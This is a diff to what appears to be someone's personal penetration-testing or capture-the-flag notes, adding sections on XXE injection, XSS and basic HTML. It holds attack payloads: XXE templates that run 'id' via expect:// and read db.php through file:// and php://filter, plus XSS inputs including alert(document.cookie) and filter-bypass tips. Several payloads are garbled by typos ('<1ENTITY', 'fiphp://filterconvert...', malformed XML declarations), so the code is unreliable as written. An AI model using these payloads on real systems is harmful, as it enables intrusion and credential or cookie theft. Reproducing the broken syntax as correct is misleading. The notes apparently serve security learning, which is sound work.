@@ -454,6 +454,9 @@ $ dotdotpwn
 
 ####### XML External Entity (XXE) Injection ########
 
+-- OWASP xxe Payload Cheatsheet
+	- https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
+
 Accessing a local resource that may not return
 -- Template:
 	<?xml version-"1.0" encoding="ISO-8859-1"?>
@@ -485,10 +488,96 @@ Accessing a local resource that may not return
 	- Find "Browse Files" button or where I would upload a file
 	- Upload xml file and intercept submit request to locate xml file
 
+-- Manual Execuation
+	- Find file/form sumbit and intercept
+	- Decode data with Burp inspector or Decoder
+	- Once decoded to xml make changes to response and reverse encode
+	- Send modified xml request
+	- Decode response for results
+
 -- Remote Code Execution
-	- 
+	- Template
+		<?xml version-"1.0" encoding="UTF-8"?>
+		<!DOCtYPE foo [
+		    <!ELEMENT foo ANY >
+		    <1ENTITY xxe SYSTEM 'expect://id' >]>
+		<creds>
+		    <user>&xxe;</user>
+		    <pass>mypass</pass>
+		</creds>
+	- Pulling shell creds from db files like db.php should work
+
+- TIP: file roots wih /bin usually means there's a shell to connect to
+- TIP: db shell username and passwords can be found in db.php files
+
+-- Pulling a db.php file with PHP wrapper
+	- From: <?xml version="1.0" encdoing"UTFo-8"?>
+			<!DOCTYPE foo [
+			<!ENITITY xxe SYSTEM 'file:///etc/db.php' >]>
+	- To: <?xml version="1.0" encdoing"UTFo-8"?>
+			<!DOCTYPE foo [
+			<!ENITITY xxe SYSTEM 'fiphp://filterconvert.base64.encode/resources/var/www.html/db.php' >]>
 
 
+
+
+####### XSS Cross Site Scripting ########
+
+- XXS Payloads Cheat Sheet
+	- https://github.com/payloadbox/xss-payload-list
+
+- Heavy in HTML and JavaScript
+- In Bug Bounty Programs if you can make an alert pop up that's CTF
+	- Example:
+		- Input field:
+			- <img src onerror="alert('CTF')"/>
+			- <img src onerror="alert('Login')"/>
+			- <img src onerror="alert(document.cookie)"/>
+		- src not being assigned a string throws the error which causes an alert
+			- <img src="skfj" onerror="alert('do something')"/>
+- If there is a search bar.. check there first!
+	- <script>alert(1)</script>
+- I should black list words/chars.. to prevent xss
+	- To get around this users can play with capitalization or encoding
+	- To blacklist chars:
+		<h1 dangerouslySetInnerHTML={{__html: pure}} /> Banned Characters<br></br>
+		<input value=(pure) onChanges{e => setPure(e.target.value.replace(/[#_/]/g,""))} />
+
+		<h1 dangerouslySetInnerHTML={{ __html: DOMpurify.santize(userInput) }} /> Sanatized with DOMPurify default settings<br></br>
+		<input value-{userInput} onChnage={e => setInput(e.target.value.replace())} />
+
+- Tip: If backslash is blacklisted use a button tag
+	- Input field
+		- <button onclick="alert('CTF')">
+- Tip: To breakout of a JavaScript script String
+	- </script><script>alert(1)</script>
+
+
+
+####### HTML & JavaScript ########
+
+- HTML is great to know to inpsect sites and breakout of code lines
+
+- <hr size="?">
+- Next Line = <br>
+- Emphasize = <em></em>
+- Strong = <strong></strong>
+- Hidden = hidden keyword attribute
+
+- Tip: <img src=""/> tag renders automatically on pages
+
+-- Check for XSS in URL bar
+	- If adding a parameter changes the output when inpsecitng
+		- google.com/?search=xss
+		- inspect: google.com/xss in source code script
+
+####### API Enumeratioin ########
+####### SSRF Server Side Scripting ########
+####### Command Injection ########
+####### File Upload ########
+####### LFI & RFL ########
+####### Cookies & Tokens ########
+####### Wordpress & CMS ########
 
 
 
